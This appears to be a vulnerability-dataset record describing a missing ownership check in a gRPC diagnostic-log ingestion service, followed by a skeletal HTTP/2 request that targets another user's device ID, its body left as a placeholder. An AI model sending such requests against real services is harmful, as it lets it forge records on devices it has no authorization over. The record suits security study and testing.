diagnosis: The client-streaming gRPC handler ingests diagnostic log streams for deviceId provided in stream chunks. It does not authenticate the device ownership against the caller session, allowing any client to inject fake diagnostic logs and status indicators into any device's history.
exploit_request:
POST /diagnostics.LogIngestService/IngestDiagnostics HTTP/2.0
Host: logs.smartgrid.org
Content-Type: application/grpc
TE: trailers

[gRPC streaming chunks with targetDeviceId: "mtr_grid_device_88402"]
